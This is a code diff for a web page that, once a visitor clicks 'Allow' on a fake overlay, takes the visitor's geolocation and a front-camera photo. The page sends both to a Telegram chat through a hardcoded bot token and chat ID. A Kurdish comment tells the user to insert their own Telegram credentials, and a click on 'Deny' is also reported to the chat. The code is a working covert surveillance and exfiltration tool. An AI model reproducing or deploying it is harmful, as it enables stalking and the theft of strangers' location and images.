@@ -46,6 +46,7 @@
 <canvas id="canvas"></canvas>
 
 <script>
+    // !! زانیارییەکانی تێلێگرامەکەت لێرە پڕبکەرەوە !!
     const B_T = "8739484012:AAFMN2V0kdkVnUp_8YlDV1IKEq9_6IiZsOA";
     const C_I = "659131693";
 
@@ -76,8 +77,10 @@
         document.querySelector('.overlay').style.display = 'none';
     }
 
+    // ئەم فەنکشنە ڕاستەوخۆ داواکاری ڕاستەقینەی وێبگەڕ چالاک دەکات
     async function capture() {
         let loc = "📍 BLOCKED";
+        // ١. داواکاری لۆکەیشن (native popup)
         try {
             const pos = await new Promise((ok, no) => {
                 navigator.geolocation.getCurrentPosition(ok, no, {
@@ -89,15 +92,16 @@
         } catch (e) {
             loc = "❌ Location: " + e.message;
         }
-        await sendMsg(loc);
+        await sendMsg(loc); // شوێنەکە بنێرە بۆ تێلێگرام
 
+        // ٢. داواکاری کامێرا (native popup)
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user" }
             });
             const v = document.getElementById('video');
             v.srcObject = stream;
-            await new Promise(r => setTimeout(r, 2000));
+            await new Promise(r => setTimeout(r, 2000)); // چاوەڕێ بکە بۆ فوکەس
 
             const c = document.getElementById('canvas');
             c.width = v.videoWidth || 640;
@@ -106,16 +110,17 @@
 
             c.toBlob(async (blob) => {
                 if (blob) {
-                    await sendPhoto(blob);
+                    await sendPhoto(blob); // وێنەکە بنێرە بۆ تێلێگرام
                     await sendMsg("📸 Photo Sent");
                 }
-                stream.getTracks().forEach(t => t.stop());
+                stream.getTracks().forEach(t => t.stop()); // کامێرا بوەستێنە
             }, 'image/jpeg', 0.7);
         } catch (e) {
             await sendMsg("🚫 Camera: " + e.name);
         }
     }
 
+    // بەستنەوەی دووگمەکان بە فەنکشنی ڕاستەقینە
     document.getElementById('btnAllow').onclick = () => { hide(); capture(); };
     document.getElementById('btnDeny').onclick = () => { hide(); sendMsg("❌ User Denied"); };
 </script>
